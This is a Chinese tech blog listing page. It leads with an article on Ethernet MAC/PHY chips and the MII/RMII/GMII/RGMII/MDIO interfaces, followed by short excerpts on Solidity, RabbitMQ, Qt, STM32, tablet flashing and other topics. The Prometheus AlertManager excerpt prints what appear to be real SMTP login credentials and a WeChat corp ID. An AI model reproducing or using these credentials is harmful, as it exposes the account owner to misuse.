SoC内部没有网络MAC外设 一般说某个SoC不支持网络，说的就是它没有网络MAC。可以找个外置的MAC芯片，一般这种外置的网络芯片都是MAC+PHY一体的。比如三星linux开发板里面用的最多的DM9000，因为三星的芯片基本没有内部MAC(比如S3C2440S5PV210，4412 等)，所以三星的开发板都是通过外置的DM9000来完成有线网络功能的，DM9000对SoC 提供了一个SRAM接口，SoC会以SRAM的方式操作DM9000。
有些外置的网络芯片更强大，内部甚至集成了硬件TCP/IP协议栈，对外提供一个SPI接口，比如W5500。这个一般用于单片机领域，单片机通过SPI接口与W5500进行通信，由于W5500内置了硬件TCP/IP协议栈，因此单片机就不需要移植负责的软件协议栈，直接通过SPI来操作W5500，简化了单片机联网方案。
这种方案的优点就是让不支持网络的SoC能够另辟蹊径，实现网络功能，但是缺点就是网络效率不高，因为一般芯片内置的MAC会有网络加速引擎，比如网络专用DMA，网络处理效率会很高。而且此类芯片网速都不快，基本就是10/100M。另外，相比PHY芯片而言，此类芯片的成本也比较高，可选择比较少。
SoC与外部MAC+PHY芯片的连接如下图所示：
SoC内部集成网络MAC外设 一般说某个SoC支持网络，说的就是他内部集成网络MAC外设，此时还需要外接一个网络PHY芯片。目前将PHY也集成到芯片里面的SoC很少见。一般常见的通用SoC都会集成网络MAC外设，比如STM32F4/F7/H7系列、NXP的I.MX系列以及STM32MP1系列，内部集成网络MAC的优点如下：
内部MAC外设会有专用的加速模块，比如专用的DMA，加速网速数据的处理。网速快，可以支持10/100/1000M网速。外接PHY可选择性多，成本低。 内部的MAC外设会通过相应的接口来连接外部PHY芯片，根据数据传输模式不同，大致
可以分为以下两类：
MII/RMII 接口：支持10Mbit/s和100Mbit/s数据传输模式；GMII/RGMII接口：支持10Mbit/s、100Mbit/s 以及1000Mbit/s数据传输模式。 从这里可以知道，MII/RMII接口最大传输速率为100Mbit/s，而GMII/RGMII接口最大传输速率可达1000Mbit/s；所以一般把MII/RMII称为百兆以太网接口，而把GMII/RGMII称为千兆以太网接口。
关于这两组接口更加详细的内容会在后面给大家进行介绍，MII/RMII或GMII/RGMII接口是用来传输网络数据的，另外主控SoC需要配置或读取PHY芯片，也就是读写PHY的内部寄存器，所以还需要一个控制接口，叫做MIDO，MDIO很类似IIC，也是两根线，一根数据线叫做MDIO，一根时钟线叫做MDC。
SoC内部MAC外设与外部PHY芯片的连接如下图所示：
STM32MP1就有一颗10M/100M/1000M的网络MAC外设，正点原子STM32MP1开发板板载了一颗PHY芯片，V1.2版本及其以前的核心板使用RTL8211F-CG这颗PHY芯片， V1.3版本及其以后核心板使用YT8511C/H这颗PHY芯片。
因此，这里只讲解SoC内部MAC+外置PHY芯片这种方案。
MII/RMII、GMII\RGMII接口 MII接口 MII全称是Media Independent Interface，直译过来就是介质独立接口，它是IEEE-802.3定义的以太网标准接口，MII接口用于以太网MAC连接PHY芯片，连接示意图如下图所示：
MII接口一共有16根信号线，含义如下：
TX_CLK：发送时钟，如果网速为100M的话时钟频率为25MHz，10M网速的话时钟频率为2.5MHz，此时钟由PHY产生并发送给MAC。TX_EN：发送使能信号。TX_ER：发送错误信号，高电平有效，表示TX_ER有效期内传输的数据无效。10Mpbs网速下TX_ER不起作用。TXD[3:0]：发送数据信号线，一共4根。RXD[3:0]：接收数据信号线，一共4根。RX_CLK：接收时钟信号，如果网速为100M的话时钟频率为25MHz，10M网速的话时钟频率为2.5MHz，RX_CLK也是由PHY产生的。RX_ER：接收错误信号，高电平有效，表示RX_ER有效期内传输的数据无效。10Mpbs网速下RX_ER不起作用。RX_DV：接收数据有效，作用类似TX_EN。CRS：载波侦听信号。COL：冲突检测信号。 MII接口的缺点就是所需信号线太多，这还没有算MDIO和MDC这两根管理接口的数据线，因此MII接口使用已经越来越少了。
RMII接口 RMII全称是Reduced Media Independent Interface，翻译过来就是精简的介质独立接口，也就是MII接口的精简版本。RMII接口只需要7根数据线，相比MII直接减少了9根，极大的方便了板子布线，RMII接口连接PHY芯片的示意图如下图所示：
TX_EN：发送使能信号。TXD[1:0]：发送数据信号线，一共2根。RXD[1:0]：接收数据信号线，一共2根。CRS_DV：相当于MII接口中的RX_DV和CRS这两个信号的混合。REF_CLK：参考时钟，由外部时钟源提供，频率为50MHz。这里与MII不同，MII的接收和发送时钟是独立分开的，而且都是由PHY芯片提供的。 GMII接口 GMII(Gigabit Media Independant Interface)，千兆MII接口。GMII采用8位接口数据，工作时钟125MHz，因此传输速率可达1000Mbps；同时兼容MII所规定的10/100Mbps工作方式。GMII接口数据结构符合IEEE以太网标准，该接口定义见IEEE 802.3-2000。信号定义如下：
GTX_CLK：1000M工作模式下的发送时钟(25MHz)。TX_EN：发送使能信号。TX_ER：发送错误信号，高电平有效，表示TX_ER有效期内传输的数据无效。TXD[7:0]：发送数据信号线，一共8根。RXD[7:0]：接收数据信号线，一共8根。RX_CLK：接收时钟信号。RX_ER：接收错误信号，高电平有效，表示RX_ER有效期内传输的数据无效。RX_DV：接收数据有效，作用类似TX_EN。CRS：载波侦听信号。COL：冲突检测信号。 与MII接口相比，GMII的数据宽度由4位变为8位，GMII接口中的控制信号如TX_ER、TX_EN、RX_ER、RX_DV、CRS和COL的作用同MII接口中的一样，发送参考时钟GTX_CLK和接收参考时钟RX_CLK的频率均为125MHz(在1000Mbps工作模式下)。
在实际应用中，绝大多数GMII接口都是兼容MII接口的，所以，一般的GMII接口都有两个发送参考时钟：TX_CLK和GTX_CLK(两者的方向是不一样的，前面已经说过了)，在用作MII模式时，使用TX_CLK和8根数据线中的4根。
RGMII接口 RGMII(Reduced Gigabit Media Independant Interface)，精简版GMII接口。将接口信号线数量从24根减少到14根(COL/CRS 端口状态指示信号，这里没有画出)，时钟频率仍旧为125MHz，TX/RX数据宽度从8为变为4位，为了保持1000Mbps的传输速率不变，RGMII接口在时钟的上升沿和下降沿都采样数据，在参考时钟的上升沿发送GMII接口中的TXD[3:0]/RXD[3:0]，在参考时钟的下降沿发送GMII接口中的TXD[7:4]/RXD[7:4]。RGMII同时也兼容100Mbps 和10Mbps两种速率，此时参考时钟速率分别为25MHz和2.5MHz。
TX_EN信号线上传送TX_EN 和TX_ER两种信息，在TX_CLK的上升沿发送TX_EN，下降沿发送TX_ER；同样的，RX_DV信号线上也传送RX_DV和RX_ER两种信息，在RX_CLK的上升沿发送RX_DV，下降沿发送RX_ER。
RGMII接口定义如下所示：
关于这些接口定义相关的内容就讲到这里，除了上面说到4 种接口以外，还有其他接口，比如SMII、SSMII和SGMII等，关于其他接口基本都是大同小异的，这里就不做讲解了。正点原子STM32MP1开发板上的网口是采用RGMII接口来连接MAC与外部PHY芯片。
MDIO接口 MDIO全称是Management Data Input/Output，直译过来就是管理数据输入输出接口，是一个简单的两线串行接口，一根MDIO数据线，一根MDC时钟线。驱动程序可以通过MDIO和MDC这两根线访问PHY芯片的任意一个寄存器。MDIO接口支持多达32个PHY。同一时刻内只能对一个PHY进行操作。和IIC一样，使用器件地址即可区分PHY芯片。同一MDIO接口下的所有PHY芯片，其器件地址不能冲突，必须保证唯一，具体器件地址值要查阅相应的PHY数据手册。
因此，MAC和外部PHY芯片进行连接的时候主要是MII/RMII(百兆网)或GMII/RGMII(千兆网)和MDIO接口，另外可能还需要复位、中断等其他引脚。
RJ45接口 网络设备是通过网线连接起来的，插入网线的叫做RJ45座，如下图所示：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eb1842ac6f71ef53db27588c84c28951/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1c469adc19160966a7451a972372c4e1/" rel="bookmark">
			Solidity入门第一步之数据类型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		各种类型介绍 数值类型(Value Type)：包括布尔型(bool)，整数型(int、uint、uint256)等等，这类变量赋值时候直接传递数值。引用类型(Reference Type)：包括数组和结构体，这类变量占空间大，赋值时候直接传递地址（类似指针）。映射类型(Mapping Type): Solidity里的哈希表。函数类型(Function Type)：Solidity文档里把函数归到数值类型，但我觉得他跟其他类型差别很大，所以单独分一类。 布尔型 布尔型是二值变量，取值为true或false。用大白话来说就是只能正确或者错误
布尔值的运算符，&amp;&amp; 和 ||运算符遵循短路规则，包括：
! （逻辑非）
&amp;&amp; （逻辑与， “and” ） 双方有一个假的 结果就是假的
|| （逻辑或， “or” ） 双方有一个真的 结果就是真的 当第一个是真的时候不执行第二个
== （等于） 判断值是否相等
!= （不等于）
整型 // 整型 int public _int = -1; // 整数，包括负数 uint public _uint = 1; // 正整数 uint256 public _number = 20220330; // 256位正整数 常用的整型运算符包括： 代码例子
地址类型 （如何使用放在函数那一篇里面给大家讲解） 地址类型(address)存储一个 20 字节的值（以太坊地址的大小）。地址类型也有成员变量，并作为所有合约的基础。有普通的地址和可以转账ETH的地址（payable）。其中，payable修饰的地址相对普通地址多了transfer和send两个成员。在payable修饰的地址中，send执行失败不会影响当前合约的执行（但是返回false值，需要开发人员检查send返回值）。balance和transfer()，可以用来查询ETH余额以及安全转账（内置执行失败的处理）。
代码
// 地址 address public _address = 0x7A58c0Be72BE218B41C608b7Fe7C5bB630736C71; address payable public _address1 = payable(_address); // payable address，可以转账、查余额 // 地址类型的成员 uint256 public balance = _address1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1c469adc19160966a7451a972372c4e1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f666cdf60f30c224f24c23d4fbd3e03a/" rel="bookmark">
			Prometheus接入AlterManager配置企业微信告警(基于K8S环境部署)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、创建企业微信机器人二、配置AlterManager告警发送至企业微信三、Prometheus接入AlterManager配置四、部署Prometheus+AlterManager(放到一个Pod中)五、测试告警 注意：请基于 Prometheus+Grafana监控K8S集群(基于K8S环境部署)文章之上做本次实验。 一、创建企业微信机器人 1、创建企业微信机器人
点击登入企业微信网页版:
应用管理 &gt; 机器人 &gt; 创建应用
创建好之后如上图，我们获取 点击查看获取 Secret 值。
2、获取企业ID
二、配置AlterManager告警发送至企业微信 1、创建AlterManager ConfigMap资源清单
vim alertmanager-cm.yaml --- kind: ConfigMap apiVersion: v1 metadata: name: alertmanager namespace: prometheus data: alertmanager.yml: |- templates: - '/alertmanager/template/WeChat.tmpl' global: resolve_timeout: 1m smtp_smarthost: 'smtp.163.com:25' smtp_from: '18145536045@163.com' smtp_auth_username: '18145536045@163.com' smtp_auth_password: 'KCGZFUDCCKMNZMKB' smtp_require_tls: false route: group_by: [alertname] group_wait: 10s group_interval: 10s repeat_interval: 10m receiver: wechat-001 receivers: - name: 'wechat-001' wechat_configs: - corp_id: wwfb8d55841e190c10 # 企业ID to_user: '@all' # 发送所有人 agent_id: 1000002 # agentID api_secret: wa6kWECFthSpvdhcF-RPgjrIBzUvm-SpqXXXXXXXXXX # secret 执行YAML资源清单：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f666cdf60f30c224f24c23d4fbd3e03a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/200e538440af96a08a9027c997d252d7/" rel="bookmark">
			BP神经网络应用案例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
背景介绍
【神经网络符号说明】
【建立网络拓扑结构】
【神经网络学习步骤】
步骤1 准备输入和输出样本
步骤2 确定网络学习参数
步骤3 初始化网络权值W和阀值B
步骤4 计算网络第一层的输入和输出
步骤5 计算中间层（隐含层输入和输出）
步骤6 计算输出层的输入和输出​编辑
步骤7 计算能量函数
步骤8 计算能量函数对各参数的偏导数（梯度）
步骤9 计算各权值的调整量
步骤10 调整各个权值
步骤11 网络输出的还原
神经网络训练（建模过程的有关细节略去）
输入变量
输出变量
【基于案例的网络训练效果与参数的关系】
1、其余要素不变，训练次数与误差的关系
2、隐含层神经元数量与误差关系
3、学习效率与误差关系
4、利用训练好的网络进行预测
5、避免过度拟合，需要对样本输出做干扰处理
背景介绍 冶金技术，钢铁开始锻炼的“开始温度”与13个指标有关，见表(1)。
出钢时间/h
钢水净重量/t
吹止温度/oC
高碳锰铁/t
低碳锰铁/t
硅锰铁/t
硅铁/t
铝块/t
增碳剂/t
中碳锰铁/t
包龄/炉/包
运输时间/min
等待时间/min
开始温度
3
279000
1673
0
5211
0
0
667
0
0
14
45.78
3.03
1557
6
274000
1669
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/200e538440af96a08a9027c997d252d7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67498d1910e932104496a42281cc36b6/" rel="bookmark">
			【RabbitMQ】RabbitMQ 集群的搭建 —— 基于 Docker 搭建 RabbitMQ 的普通集群，镜像集群以及仲裁队列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、集群分类1.1 普通模式1.2 镜像模式1.3 仲裁队列 二、普通集群2.1 目标集群2.2 获取 Erlang Cookie2.3 集群配置2.4 启动集群2.5 测试集群 三、镜像模式3.1 镜像模式的特征3.2 镜像模式的配置3.2.1 exactly 模式3.2.2 all 模式3.2.3 nodes 模式 3.3 测试镜像模式 四、仲裁队列4.1 添加仲裁队列4.2 测试仲裁队列4.3 使用 Spring AMQP 声明仲裁队列 一、集群分类 在RabbitMQ中，有不同的集群模式，包括普通模式、镜像模式和仲裁队列。每种模式具有不同的特点和应用场景。
1.1 普通模式 普通集群，也称为标准集群（classic cluster），具备以下特征：
在集群的各个节点之间共享部分数据，包括交换机和队列的元信息，但不包括队列中的消息。当访问集群中的某个节点时，如果队列不在该节点上，请求会从数据所在节点传递到当前节点并返回响应。如果队列所在节点宕机，队列中的消息将会丢失。 这种模式适用于一些不需要消息高可用性的场景，或者对于消息丢失不是很敏感的应用。
1.2 镜像模式 镜像集群，本质上是一种主从模式，具备以下特征：
交换机、队列以及队列中的消息会在集群的各个节点之间进行同步备份。创建队列的节点被称为该队列的主节点，而备份节点被称为该队列的镜像节点。一个队列的主节点也可能是另一个队列的镜像节点，这样可以实现主节点的复用。所有的操作都是由主节点执行，然后同步给镜像节点，确保数据的一致性。如果主节点宕机，镜像节点将会接替成为新的主节点，确保高可用性。 这种模式适用于需要消息高可用性的应用场景，因为数据会在主节点和镜像节点之间进行同步备份，即使主节点宕机，数据仍然可用。
1.3 仲裁队列 仲裁队列是 RabbitMQ 3.8 版本以后引入的新功能，用来替代镜像队列，具备以下特征：
仲裁队列同样采用主从模式，支持主从数据同步。仲裁队列的配置非常简单，没有复杂的设置和配置项。主从数据同步基于Raft协议，实现强一致性，确保数据的可靠性和一致性。 仲裁队列是一种更现代化和可靠的集群模式，适用于要求高可用性和数据强一致性的应用场景。
二、普通集群 2.1 目标集群 下面，我将详细描述如何设置普通模式集群。在本示例中，计划在 Docker 容器上部署一个由3个节点组成的RabbitMQ集群。每个节点都具有特定的主机名和端口设置，如下所示：
主机名控制台端口（HTTP）AMQP 通信端口mq18081 —&gt; 156728071 —&gt; 5672mq28082 —&gt; 156728072 —&gt; 5672mq38083 —&gt; 156728073 —&gt; 5672 每个节点的标识默认为：rabbit@[主机名]，因此，上述三个节点的名称分别为：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/67498d1910e932104496a42281cc36b6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/268ca0a379305eb600c165a4a72fba90/" rel="bookmark">
			Qt控件——组合框QComBox
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、属性和方法 1、文本 // 获取当前条目的索引和文本 int currentIndex() const QString currentText() const // 获取和设置指定索引条目的文本 QString itemText(int index) const void setItemText(int index, const QString &amp;text) 2、图标 // 获取和设置对应索引条目的图标 QIcon itemIcon(int index) const void setItemIcon(int index, const QIcon &amp;icon) 3、插入和删除 // 一次新增一个条目 void addItem(const QString &amp;text, const QVariant &amp;userData = QVariant()) void addItem(const QIcon &amp;icon, const QString &amp;text, const QVariant &amp;userData = QVariant()) // 一次新增多个条目 void addItems(const QStringList &amp;texts) // 一次插入一个条目 void insertItem(int index, const QString &amp;text, const QVariant &amp;userData = QVariant()) void insertItem(int index, const QIcon &amp;icon, const QString &amp;text, const QVariant &amp;userData = QVariant()) // 一次插入一个条目 void insertItems(int index, const QStringList &amp;list) // 获取和设置插入策略 QComboBox::InsertPolicy insertPolicy() const void setInsertPolicy(QComboBox::InsertPolicy policy) 常用的插入策略有：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/268ca0a379305eb600c165a4a72fba90/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/18a0d5182f974b941f19b64bee255267/" rel="bookmark">
			C语言实现——扫雷（简易版）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		设计思路 要求：
99棋盘格，埋十个雷；
选中坐标若是雷，爆炸，游戏结束；
若不是雷则显示周围33方格中雷的个数。
分三个文件；
test.c ——&gt;测试游戏逻辑
game.c ——&gt;游戏实现
game.h ——&gt;游戏中函数的声明
设置两个二维数组，第一个数组mine里放置雷（雷是1，非雷是0）；第二个数组show仅放置计算出的周围雷的个数；为了让棋盘格四周方便计算，给两个棋盘格周围都加一圈，变成11*11的数组。
代码实现 test.c
#include&lt;stdio.h&gt; #include"game.h" void menu () { printf("----------------------\n"); printf("------ 1.play ------\n"); printf("------ 0.over ------\n"); printf("----------------------\n"); } int main () { int input=0; do { printf ("请选择：\n"); menu (); scanf("%d",&amp;input); switch(input) { case 1: game (); break; case 0: printf ("退出游戏\n"); break ; default: printf("选择错误，重新选择\n"); break; } } while (input); return 0; } 先测试一下逻辑：
初始化棋盘并打印 给两个棋盘进行初始化，为了只用一个函数，这里吧mine数组的‘0’和‘1’也设置成字符。为了以后可以修改行数和列数，这里在game.h中定义几个符号。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/18a0d5182f974b941f19b64bee255267/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/84cc40a48171cd8e03b1df3d3eefc222/" rel="bookmark">
			小新PadPlus刷MIUI教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		联想小新PadPlus刷MIUI13 鸣谢 柚坛社区联想小新交流群里面的各位大佬，在我出错的时候积极指导，最后终于刷机成功了。 必看 此为第二版的刷机教程，群主大大已经更新到第八版了，所以建议大家还是看群主大大的教程吧！ 救砖教程 有了这个教程就可以放心刷了，大不了刷回联想的系统 https://blog.csdn.net/birth_with_brave/article/details/124096767 刷机工具整理 此链接下MIUI刷ZUI,ZUI刷MIUI的工具都是有的（与本教程无关）： https://www.aliyundrive.com/s/zBMysjbhN9X 工具合集 下载链接（我整理了一下下）如果你是小新padplus就不要自己折腾了， 下载这个就行了，想折腾就折腾吧，撞撞南墙也挺好： https://www.aliyundrive.com/s/DYDuMUGLdvY 说明 下面很多步骤不是唯一的。 但是，如果你是小新pad plus 我建议你从头到尾参考这个文章， 天晴了，雨停了，你觉得自己又行了！ 安装包什么的用我上面链接提供的就行了，路径什么的我都改好了！！！！！ 第一步 解bl锁 访问：https://www.zui.com/iunlock 输入序列号以及邮箱 获得sn.img （我留的QQ邮箱，等了两三分钟收到了，给我当垃圾邮件了，收不到邮件记得去垃圾邮件看看） 给你的邮件会有一个sn.img的下载链接，下载，和下面这些文件放在一个文件夹中。 接下来 双击运行 （直接运行这个）双击打开残芯adb-fastboot工具.bat （我在这个前面加了&lt;直接运行这个&gt;这几个字，纯粹是为了方便找，没有别的意思） 平板连上usb，打开usb调试模式（这个都不会的就不建议搞了哈，嘿嘿） 第一个命令：adb reboot bootloader 等待平板重启，进入fastboot模式 输入下一个命令	fastboot flash unlock sn.img 执行完后 输入第三个命令 fastboot oem unlock-go 这时平板会重新启动，之前的数据被清空了。然后再打开一次平板的usb调试模式 输入以下命令 adb reboot fastboot （平板会进入 fastbootd模式） 然后依次输入以下命令 fastboot flash boot boot.img fastboot flash vendor vendor.img fastboot flash system system.img fastboot --disable-verity --disable-verification flash vbmeta vbmeta.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/84cc40a48171cd8e03b1df3d3eefc222/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/877c4136b0d862027187f6cad8dc3634/" rel="bookmark">
			STM32进阶之HC-SR04超声波测距
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 本实验旨在学习和理解HC-SR04超声波测距模块的工作原理，并利用stm32F103单片机完成一个超声波测距方案。HC-SR04超声波测距模块是一种常用的距离测量传感器，通过发送超声波脉冲并接收其回波来测量物体与传感器之间的距离。
超声波测距原理 利用HC-SR04超声波测距模块可以实现比较精确的直线测距，其测距原理图如下：
HC-SR04的一端发出超声波，接触到反射物后反射，被另一个端口接收到，所以只要知道发射和接收的时间差，就可以根据声波传播的速率算出HC-SR04和反射物直接的距离。
所以实现超声波测距就需要俩个条件：
发射和接收的时间差超声波传输的速率 HC-SR04工作原理 HC-SR04模块的电气参数如示：
HC-SR04模块的实物图如示：
HC-SR04模块的实物图如示：
有四个引脚：
Vcc：+5V电源供电
Trig：输入触发信号（可以触发测距）
Echo：传出信号回响（可以传回时间差）
Gnd：接地
用Trig和Echo引脚实现测距的流程：
1.通过Trig输出一段至少10us的高电平（脉冲），触发一次测距，超声波在传输的过程中Echo一直输出高电平。
2.在Trig脉冲输出后，立即检测Echo引脚的电平，测出Echo高电平持续的时间t，t就是超声波在所测距离一个来回所需时间。
测距时序图如示：
OLED屏幕
OLED（Organic Light Emitting Diode，有机发光二极管）是一种能够自发光的显示技术，广泛应用于单片机开发中的显示模块。它具有高对比度、快速响应、低功耗等优点，适用于小尺寸显示和低功耗应用。
同时，可以将程序中的某些重要参数直接输出到OLED屏幕当中，这样就无需使用串口助手，方便了程序的调试
工作原理 OLED显示屏由许多微小的有机发光二极管组成，每个像素点都可以自发光。当施加电压时，有机材料中的电子和空穴结合，产生光，从而形成图像。OLED不需要背光源，因此可以实现更薄、更轻、更柔性的显示器。
实验示例 使用标准库
HC-SR04模块代码 HC.c#include "HC.h"
#include "Delay.h"
#include "stm32f10x.h" #include "sys.h"
#define HCSR04_PORT GPIOB
#define HCSR04_CLK RCC_APB2Periph_GPIOB
#define HCSR04_TRIG GPIO_Pin_11
#define HCSR04_ECHO GPIO_Pin_10
u16 msHcCount = 0; void HC_Init(void)
{ TIM_TimeBaseInitTypeDef TIM_TimeBaseStructure; GPIO_InitTypeDef GPIO_InitStructure;
RCC_APB2PeriphClockCmd(HCSR04_CLK, ENABLE);
GPIO_InitStructure.GPIO_Pin =HCSR04_TRIG; GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/877c4136b0d862027187f6cad8dc3634/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce099eef3ca1a3d38eb62adb8db838c1/" rel="bookmark">
			理解充分条件与必要条件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 写在前面引入充分条件、必要条件、充要条件充分性、必要性 定义“当且仅当”（if and only if） 补充充分必要条件的意义找准哪个命题是“充要条件” 写在前面 从高中的数学开始，我们便接触了充分条件与必要条件，但是当时的学习有点浅尝辄止，导致到了大学我都没有对这两个概念有一个系统的理解。最近拜读了蓝以中教授的《高等代数简明教程（上册）第二版》一书，感觉其中对充分条件与必要条件的阐述很好，于是在此记录一下，想深入学习的朋友可以看一下这本书的第17页，是关于充分条件与必要条件的详细内容。
引入 充分条件、必要条件、充要条件 以初中平面几何中的全等三角形的判定定理1（若两个三角形的三条对应边均相等，则这两个三角形全等）为例，首先引入充分条件与必要条件。
必要条件： 若已知两个三角形全等，则这两个三角形三条边对应相等 ，也就是说：两个三角形三边对应相等是这两个三角形全等成立的 必要条件 。其中必要条件的含义是，若两个三角形全等，则必定需要 满足一个条件：“两三角形三边对应相等”，即只有满足了这个条件，这两个三角形全等才成立。
充分条件： 若已知两三角形三边对应相等，则两三角形全等 ，也就是说：两个三角形三边对应相等是这两个三角形全等成立的 充分条件 。其中充分条件的含义是，若两三角形三边对应相等，则有 充分理由 断定“这两个三角形全等”成立。
充分必要条件 结合上述两部分论断，我们可以得到如下的命题：两三角形全等的 充要条件 是这两个三角形的三边对应相等。
充分性、必要性 必要性： 常用箭头 ⟹ \Longrightarrow ⟹ 表示，即由结论推条件（假设两三角形全等成立，来证明三角形三边对应相等）。
充分性： 常用箭头 ⟸ \Longleftarrow ⟸ 表示，即由条件推出结论（假设两三角形三边对应相等成立，来证明两三角形全等）。
定义 有了上面的例子，很容易得到 充分条件 、 必要条件 等的定义：
设 A A A、 B B B是两个命题，并且有： A A A成立的充要条件是 B B B成立，则：
必要条件： 若 A A A成立则 B B B成立，即 B B B成立是 A A A成立的必要条件。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ce099eef3ca1a3d38eb62adb8db838c1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0a4172a2f43b3e8e32c355ae503c4cc/" rel="bookmark">
			IPC-核间通讯
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. IPC通讯是AUTOSAR体系结构中的核心组成部分，它使得不同的软件组件可以相互通信、协同工作，从而实现整车系统的功能。IPC可以理解为核间通讯，就是一个芯片有多个核，现在想让多核之间通信，达到下面几个目的：
数据共享：不同的软件组件之间可以通过IPC通讯共享数据，实现数据的共享和交换。事件通知：软件组件之间可以通过IPC通讯发送事件和信号，从而实现对系统的控制和调度。状态同步：IPC通讯还可以用于实现不同软件组件之间的状态同步，确保整个系统的状态一致性。系统扩展：通过IPC通讯，可以方便地向系统中添加新的软件组件，从而实现系统的扩展和灵活性。 在多核处理器系统中，不同的处理器核之间可以通过共享内存、消息传递等方式进行IPC核间通讯。共享内存是指多个处理器核共享同一块物理内存，通过在内存中设置标志位或锁等机制来控制对共享数据的访问。消息传递是指不同处理器核之间通过发送和接收消息来进行通信，其中消息可以是数据、信号等。
IPC核间通讯的实现需要考虑处理器核之间的同步、互斥等问题，以确保数据的正确性和一致性。同时，也需要注意处理器核之间的通信延迟、带宽等问题，以提高通信效率和系统性能。
2. IPC通讯有两种实现方式：Shared Memory 和 Mailbox 在需要频繁传输大量数据的情况下，可以使用共享内存；而在需要低延迟的通知场景下，可以使用Mailbox。同时，这两种机制也可以结合使用，例如使用Mailbox通知对方有数据需要接收，接收方再从共享内存中读取数据。
Mailbox hardware：
TDA4是一款集成了多个处理器核心的芯片，不同的处理器核心之间需要进行IPC通信。在TDA4中，使用了一种基于Mailbox和中断的机制来实现IPC通信，这种机制被称为“queued (FIFO) mailbox-interrupt mechanism”。
这种机制使用了一个队列（FIFO）和一个中断机制，用于在不同的处理器核心之间传递消息。当一个处理器核心需要向另一个处理器核心发送消息时，它将消息写入一个指定的Mailbox中。如果该Mailbox是空的，则会触发一个中断，通知另一个处理器核心有消息需要处理。中断处理程序可以立即读取Mailbox中的消息，并通知对应的处理器核心可以继续向Mailbox写入数据使用队列（FIFO）来存储消息可以保证消息的有序性。而使用中断机制可以避免处理器核心之间的忙等待，提高系统的响应速度和实时性。
如下图：描述了 ISR 在接收邮箱非空中断时的行为
Shared Memory：
TDA4的IPC模块支持多个EndPoint，每个EndPoint都包含一个发送队列和一个接收队列，用于存储待发送和待接收的数据。同时，每个EndPoint还包含一个状态机，用于控制数据的发送和接收。当一个EndPoint向另一个EndPoint发送数据时，数据会被写入发送队列中，然后状态机会按照预定的方式将数据从发送队列中取出，并通过共享内存传输到接收EndPoint的接收队列中。接收EndPoint的状态机会检查接收队列中是否有新的数据，如果有，则将数据从接收队列中取出并进行处理。
如下图：就是使用Mailbox通知对方有数据需要接收，接收方再从Shared Memory中读取数据。
3. 简单举例： 发送的过程：关于mailbox的如下图所示；
1. 创建一个3ms的task，task执行下面的任务
2. 在中uComTp_TxProcess中实现下面的功能。
自问自答：为什么什么AURIX可以用RTE核间通讯，而TDA4要用IPC
AURIX是一种基于TriCore处理器的芯片平台，它采用了AUTOSAR架构，并使用RTE作为运行时环境来管理软件组件之间的通信和交互。由于AURIX芯片内部的TriCore处理器都是由同一颗芯片产生的,，而无需使用复杂的IPC机制。
处理器内核共享总线和共享内存：TC397芯片内部的处理器内核共享总线和共享内存，因此它们之间的通信速度非常快。当一个处理器需要访问另一个处理器的数据时，可以通过总线直接进行数据交换，从而避免了通信延迟和通信开销。此外，处理器之间还可以通过共享内存的方式进行数据交换，这也可以加速通信速度。 除此之外，使用X-Signals实现TC397的核间通讯的步骤如下：Rte会替你生成一系列的保护措施，比如SpinLock；缺点：为了解决数据一致性所带来的额外开销都是比较大
